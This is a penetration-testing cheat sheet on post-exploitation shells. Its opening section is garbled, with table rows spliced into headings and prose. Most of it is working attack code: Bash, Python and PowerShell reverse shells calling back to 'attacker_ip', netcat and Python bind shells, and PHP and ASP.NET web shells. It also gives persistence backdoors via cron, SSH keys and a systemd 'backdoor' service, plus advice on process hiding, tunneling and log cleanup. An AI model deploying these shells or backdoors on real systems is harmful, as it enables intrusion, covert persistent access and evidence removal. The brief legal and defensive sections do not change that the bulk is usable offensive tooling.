# Shells and Post-Exploitation AccessThree types:

Reverse Shell, Bind Shell, and Web Shell

Different types of command execution interfaces for maintaining access to compromised systems during penetration testing.

|Type of Shell|Method of Communication|

## Overview|---|---|

|`Reverse Shell`|Connects back to our system and gives us control through a reverse connection.|

Shells provide command-line access to compromised systems and are essential for post-exploitation activities. Understanding different shell types, their advantages, and implementation methods is crucial for maintaining persistent access during penetration testing engagements.|`Bind Shell`|Waits for us to connect to it and gives us control once we do.|

|`Web Shell`|Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.|

## Shell Types

| Shell Type | Communication Method | Use Case |
|------------|---------------------|----------|
| **Reverse Shell** | Connects back to attacker system | Bypasses firewalls, NAT |
| **Bind Shell** | Waits for attacker connection | Direct network access |
| **Web Shell** | HTTP-based communication | Web application compromise |

### Reverse Shell

**Description**: Target system initiates connection back to the attacker's machine.

**Advantages**:
- Bypasses inbound firewall restrictions
- Works behind NAT/proxy configurations
- Attacker controls the listening service

**Disadvantages**:
- Requires attacker to have accessible IP
- May be blocked by outbound filtering
- Leaves network artifacts

### Bind Shell

**Description**: Target system listens on a port, waiting for attacker connection.

**Advantages**:
- Simple implementation
- Direct system control
- No dependency on attacker infrastructure

**Disadvantages**:
- Blocked by inbound firewalls
- Easily detected by port scans
- Visible network service

### Web Shell

**Description**: Web-based interface accepting commands via HTTP parameters.

**Advantages**:
- Blends with legitimate web traffic
- Works through firewalls/proxies
- Persistent across system reboots

**Disadvantages**:
- Limited functionality
- Requires web server access
- Logged in web server logs

## Shell Implementation Examples

### Reverse Shell Implementations

#### Bash Reverse Shell

```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Alternative method
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f
```

#### Python Reverse Shell

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker_ip",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

#### PowerShell Reverse Shell

```powershell
# PowerShell reverse shell
$client = New-Object System.Net.Sockets.TCPClient("attacker_ip",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
```

### Bind Shell Implementations

#### Netcat Bind Shell

```bash
# Traditional netcat
nc -lvp 4444 -e /bin/bash

# OpenBSD netcat (without -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 4444 > /tmp/f
```

#### Python Bind Shell

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",4444))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Web Shell Implementations

#### PHP Web Shell

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

#### ASP.NET Web Shell

```csharp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    if (Request.QueryString["cmd"] != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

## Shell Upgrade Techniques

### TTY Shell Upgrade

| Method | Command | Platform |
|--------|---------|----------|
| **Python PTY** | `python -c 'import pty; pty.spawn("/bin/bash")'` | Linux |
| **Echo method** | `echo os.system('/bin/bash')` | Linux |
| **sh upgrade** | `/bin/sh -i` | Unix/Linux |
| **Perl** | `perl —e 'exec "/bin/sh";'` | Unix/Linux |

### Full TTY Shell Process

```bash
# Step 1: Spawn PTY
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background session
Ctrl+Z

# Step 3: Set terminal
stty raw -echo

# Step 4: Foreground session
fg

# Step 5: Set environment
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 38 columns 116
```

## Persistence Mechanisms

### Cron Jobs

```bash
# Add reverse shell to cron
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" | crontab -
```

### SSH Keys

```bash
# Add SSH key for persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Service Creation

```bash
# Create systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
```

## Detection Evasion

### Process Hiding

| Technique | Implementation | Effectiveness |
|-----------|---------------|---------------|
| **Process naming** | Rename to common process | Low |
| **Parent process spoofing** | Hide under legitimate process | Medium |
| **Rootkit usage** | Kernel-level hiding | High |

### Network Evasion

| Method | Description | Implementation |
|--------|-------------|---------------|
| **HTTP tunneling** | Encapsulate shell in HTTP | Tools like tunna, reGeorg |
| **DNS tunneling** | Use DNS queries for communication | Tools like dnscat2, iodine |
| **Encrypted shells** | SSL/TLS encrypted communication | Socat, stunnel |

## Shell Management Tools

### Multi-handler Tools

| Tool | Description | Platform |
|------|-------------|----------|
| **Metasploit** | `multi/handler` module | Cross-platform |
| **Empire** | PowerShell post-exploitation | Windows |
| **Covenant** | .NET command and control | Windows |
| **Sliver** | Modern C2 framework | Cross-platform |

### Custom Listeners

```bash
# Simple netcat listener
nc -lvp 4444

# Persistent listener with logging
while true; do nc -lvp 4444 | tee -a shell.log; done

# SSL encrypted listener
ncat --ssl -lvp 4444
```

## Security Considerations

### Legal and Ethical Guidelines

- Only deploy shells on systems you're authorized to test
- Remove all persistence mechanisms after testing
- Document all access methods for client remediation
- Use encrypted communications when possible
- Follow engagement rules and scope limitations

### Operational Security

| Practice | Purpose | Implementation |
|----------|---------|---------------|
| **Encrypted communication** | Prevent traffic analysis | SSL/TLS, VPN tunnels |
| **Legitimate process mimicry** | Avoid detection | Process name spoofing |
| **Log cleanup** | Remove evidence | Clear command history, logs |
| **Timing considerations** | Blend with normal activity | Off-hours access |

## Defensive Measures

### Detection Methods

| Method | Indicators | Tools |
|--------|------------|-------|
| **Network monitoring** | Unusual outbound connections | IDS/IPS, firewalls |
| **Process monitoring** | Suspicious processes | EDR solutions |
| **File integrity** | Unauthorized files | HIDS, tripwire |
| **Log analysis** | Command execution patterns | SIEM systems |

### Prevention Strategies

| Control | Purpose | Implementation |
|---------|---------|---------------|
| **Application whitelisting** | Prevent unauthorized execution | AppLocker, SRP |
| **Network segmentation** | Limit lateral movement | VLANs, firewalls |
| **Privilege restrictions** | Limit shell capabilities | Least privilege principle |
| **Endpoint protection** | Detect and block shells | Anti-malware, EDR |

## Additional Resources

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [GTFOBins](https://gtfobins.github.io/)